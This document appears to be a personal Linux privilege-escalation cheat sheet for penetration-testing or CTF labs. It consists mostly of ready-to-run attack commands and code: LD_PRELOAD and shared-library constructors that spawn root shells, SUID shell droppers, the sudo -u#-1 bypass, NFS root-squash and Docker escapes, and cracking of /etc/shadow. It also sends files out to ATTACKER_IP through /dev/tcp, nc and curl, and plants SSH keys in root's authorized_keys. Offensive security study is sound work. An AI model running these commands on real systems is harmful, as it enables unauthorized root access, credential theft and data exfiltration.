

### Upgrade to TTY Shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116
echo os.system("/bin/bash")
/bin/bash -i
```


### System-Enumeration
```bash
hostname 
uname -a
cat /etc/issue
/proc/version
lscpu
ps aux
ps aux | grep username
ps -ef --forest
ps -aux | grep root
env
lsb_release -a
cat /etc/os-release
cat /etc/lsb-release

```

### Usefull find command:
```bash
find . -name flag1.txt: find the file named “flag1.txt” in the current directory
find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
find / -type d -name config: find the directory named config under “/”
find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
find / -perm a=x: find executable files
find /home -user frank: find all files for user “frank” under “/home”
find / -mtime 10: find files that were modified in the last 10 days
find / -atime 10: find files that were accessed in the last 10 day
find / -cmin -60: find files changed within the last hour (60 minutes)
find / -amin -60: find files accesses within the last hour (60 minutes)
find / -size 50M: find files with a 50 MB size
```

### User-Enumeration
```bash
whoami
id
sudo -l
cat /etc/passwd
cat /etc/passwd | cut -d : -f 1
cat /etc/shadows
cat /etc/groups
groups #command
history 
sudo -u user /bin/echo Hello World!	Run a command with sudo
sudo su -	Switch to root user (if we have access to sudo su)
```


### Network-Enumeration
```bash
ifconfig or ip a
ip route
arp -a
netstat -ano
```

### Password-Hunting:
```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
locate password,passwd,secret | more
find / -name id_rsa 2> /dev/null
history | grep pass

# This is very common with configuration files, log files, and user history #files (bash_history in Linux and PSReadLine in Windows)
```

### Extracting and Cracking Passwords
if the shadow file is accessible 
```bash
cat /etc/passwd > passwd_copy.txt
cat /etc/shadow > shadow_copy.txt
unshadow passwd_copy.txt shadow_copy.txt > unshadowed.txt
hashcat -m 1800 unshadowed.txt rockyou.txt --force
```

## Checking environment :
```bash
env
set
```



### Exploiting LD_PRELOAD env :
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```
``
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
sudo LD_PRELOAD=/tmp/shell.so find
id
whoami
```

### Sudo Security Bypass (CVE-2019-14287) :
```bash
# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash
```
```bash
sudo -u#-1 <command>
```

### Sudo Buffer Overflow (pwfeedback):
check out exploit

### SUID Escalation :
```bash
find / -type f -perm -u=s 2> /dev/null
find / -type f -perm -g=s 2> /dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

###  Capabilities :
```bash
getcap -r / 2>/dev/null
capsh --print
```


###  Privilege escalation using Scheduled-Tasks:
```bash
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root
crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

```bash
cat /etc/crontab
crontab -e -u user
```

checkout other root processs :
```
./pspy64 -pf -i 1000
```

###  NFS Root Squashing:
```bash
cat /etc/exports
grep "nfs" /var/log/syslog
showmount -e MACHINE_IP(target ip)
mkdir /tmp/1
mount -o rw,vers=2 MACHINE_IP:/tmp /tmp/1
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x

victum:
chmod +s /tmp/1/x
```

###  Escalation-Path-Docker:
if the user is member of docker:
```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```


###  $PATH is Dangerous:

```bash
echo $PATH
~/.bash_profile
~/.bashrc
~/.profile
sudo cat /etc/sudoers | grep secure_path
find / -perm -4000 -user root -type f 2>/dev/null #checkout root user with suid bit set
for dir in $(echo $PATH | tr ':' '\n'); do [ -w "$dir" ] && echo "[+] Writable: $dir"; done #Path directory writetable permission.

#malicious file run by root user with suid bit set.
cp /bin/bash /tmp/ls
chmod +x /tmp/ls


```


> [!INFO]
> Editing /etc/passwd File for Privilege Escalation .
> openssl passwd raj
> write these hash in x position of /etc/passwd of user. if passwd have rwx permission


## Vulnerable Software:
Another thing we should look for is installed software. For example, we can use the dpkg -l command on Linux or look at C:\Program Files in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.




###  Usefull Scripts or C file codes:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);   // Set user ID to root
    setgid(0);   // Set group ID to root
    system("/bin/bash");  // Launch a root shell
    return 0;
}

gcc /tmp/rootme.c -o /tmp/rootme

```

```c
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```



> [!INFO]
> Now at last run linux automation scripts like linpeas, , or other automated scripts. GTFOBins contains a list of commands and how they can be exploited through >sudo. We can search for the application we have sudo privilege over, and if it exists, it may tell us the exact command we should execute to gain root access >using the sudo privilege we have.

>LOLBAS also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands >in the context of a privileged user.



## File transfer :
```bash
# Upload
bash -c 'cat /path/to/file > /dev/tcp/ATTACKER_IP/PORT'

# Download
bash -c 'cat < /dev/tcp/ATTACKER_IP/PORT > file_saved'


# Upload
nc ATTACKER_IP PORT < /path/to/file

# Download
nc ATTACKER_IP PORT > file_saved

# Listen to receive
nc -lnvp PORT > received_file

# Listen to send
nc -lnvp PORT < /path/to/file



# Start HTTP server (Python 3)
python3 -m http.server 2121

# Start HTTP server (Python 2)
python -m SimpleHTTPServer 2121

# Download with wget
wget http://ATTACKER_IP:2121/filename

# Download with curl
curl http://ATTACKER_IP:2121/filename -o file_saved


# Upload
scp -P 2121 /path/to/file user@ATTACKER_IP:/destination/

# Download
scp -P 2121 user@ATTACKER_IP:/path/to/file file_saved


ftp ATTACKER_IP
put /path/to/file
get filename

# Upload
tftp ATTACKER_IP
put /path/to/file

# Download
tftp ATTACKER_IP
get filename


curl -X POST --data-binary @/path/to/file http://ATTACKER_IP:PORT/upload

```



## SSH Keys :
```bash
 If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server. If we can read the /root/.ssh/ directory and can read the id_rsa file, we can copy it to our machine and use the -i flag to log in with it:
 
somx@htb[/htb]$ vim id_rsa
somx@htb[/htb]$ chmod 600 id_rsa
somx@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa

root@10.10.10.10#

If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file:

somx@htb[/htb]$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+

This will give us two files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine. Let us copy key.pub, then on the remote machine, we will add it into /root/.ssh/authorized_keys:

user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys

ssh-keygen -f key	Create a new SSH key
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys	Add the generated public key to the user
ssh root@10.10.10.10 -i key	SSH to the server with the generated private key
```













![[Pasted image 20250505112319.png]]


